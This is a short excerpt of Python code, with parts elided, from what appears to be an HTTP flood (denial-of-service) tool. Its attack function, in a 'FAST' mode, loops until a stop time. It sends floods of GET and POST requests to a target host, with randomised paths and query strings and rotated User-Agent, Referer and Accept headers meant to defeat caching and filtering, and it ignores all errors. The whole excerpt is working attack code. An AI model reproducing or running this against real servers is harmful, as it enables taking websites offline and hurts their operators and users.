    ...
    def attack(threadcount):
        try:
            ...
            if args.attack_mode == 'FAST':
                ...
                while time.time() < stop:
                    try: sock.send( f'GET /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n\r\n'.encode() )
                    except: pass
                    try: sock.send( f'POST /{randomstr(10, 20)}?{randomstr(20, 30)}={randomstr(20, 30)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {choice(useragents)}\r\nReferer: {choice(referers) + randomstr(5, 10)}\r\nAccept: {choice(accepts)}\r\nAccept-Charset: {choice(accept_charset)}\r\nAccept-Encoding: {choice(encodings)}\r\nUpgrade-Insecure-Requests: 1\r\nConnection: close\r\nCache-Control: no-store,private,must-revalidate,max-age=0\r\n{postdata()}'.encode() )
                    except: pass
